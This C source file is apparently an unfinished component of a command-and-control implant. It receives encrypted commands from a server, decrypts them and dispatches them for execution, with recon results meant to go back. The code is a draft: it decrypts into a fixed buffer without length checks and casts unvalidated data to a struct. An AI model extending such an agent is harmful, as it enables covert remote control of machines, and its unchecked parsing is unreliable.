/* MessageConsumer.h (rename later?) */
/* MessageConsumer.h handles all incoming messages from server */

/* define structures of incoming messages/packets */

// TODO: data validition

// TODO: all communication layers should be established here?
// 		 tcp, http/s, dns, ssl/tls

#include "C2Profile.h"
#include "encoders/decode.h"
#include "cryptography/decrypt.h"
#include "MessageHandler.h"

/*
 * Order:
 *  // process incoming message/command
 * 	- receive raw bytes from socket (or http?)
 * 	- decode (if http transport)
 * 	- decrypt and verify authentication tag
 * 	- deserialize into InternalMessage
 * 	- valiidate message 
 * 	- extract message type from header
 * 	
 *  // do internal logic 
 * 	- call appropriate function to handle specific message type 
 * 	- deserialize command specific payload?
 * 	- execute command
 * 	- collect,process,generate results/output
 *
 * 	// Start prepping to send back data to server
 * */



// TODO: add custom enum error codes, to use as return values for this function... so i can see what/where the error came from
// NOTE: rawData (comes from recv function) -> decrypt -> decompress (if needed) -> decode (if needed) -> deserialize/parse -> handle command
// TODO: rawData should be const?
//int handleTCP(uint8_t* rawData, size_t rawDataLength, Config* config)  // TODO: add InternalMessage var to store result?
int handleTCP(uint8_t* rawData, size_t rawDataLength, InternalMessage* resultMsg, Config* config)
{
	// Raw Bytes from Socket
	uint8_t buf[4096]; // TODO: rename to plaintext?

	// DECRYPT -> Decrypted Bytes
	// [IV (12 bytes - cleartext)][Ciphertext (encrypted)][Tag (16 bytes - cleartext)]
	const uint8_t* iv = rawData;
	const uint8_t* ciphertext = rawData + 12;
	size_t ciphertext_len = rawDataLength - 12 - 16;
	const uint8_t* tag = rawData + 12 + ciphertext_len;
	int decrypted_size = decrypt_aes_256_gcm(ciphertext, ciphertext_len, config->crypto_key, iv, tag, buf); // TODO: decrypted_size

	// check if length(buf) is at least the sizeof(MessageHeader), otherwise throw error
	// parseHeader()
	// check if sizeof(MessageHeader) + header->payloadSize == decrypted_size, otherwise throw error

	// DESERIALIZE -> InternalMessage 
	// check length(plaintext) == sizeof(InternalMessage)
    // const InternalMessage* msg = (const InternalMessage*)plaintext;
	// VALIDATE
    // size_t expected_size = offsetof(InternalMessage, data) + msg->data_len;
    // check length(plaintext) == expected_size

	InternalMessage* msg = (InternalMessage*)buf;

	// EXECUTE (InternalMessage)
	// call function based on InternalMessage
	//processMessage(msg->payload, msg->header); // TODO: check return type for errors?
	processMessage(msg, config);

	// TODO: convert InternalMessage from processMessage into an InternalMessage.payload
	//InternalMessage* response = malloc(sizeof(InternalMessage));
	//memcpy(response->payload, &recon, sizeof(ReconData));
	//response->header.payload_size = sizeof(ReconData);

	// TODO: cleanup/free buf
}


int handleHTTPS(uint8_t* data)
{
	// HTTPS Text Message

	// PARSE HTTP HEADERS

	// EXTRACT JSON BODY

	// EXTRACT BASE64 FIELD

	// BASE64 DECODE -> Raw Bytes

	// DECRYPT -> Decrypted Bytes

	// DESERIALIZE -> InternalMessage

	// VALIDATE

	// EXECUTE (InternalMessage)


}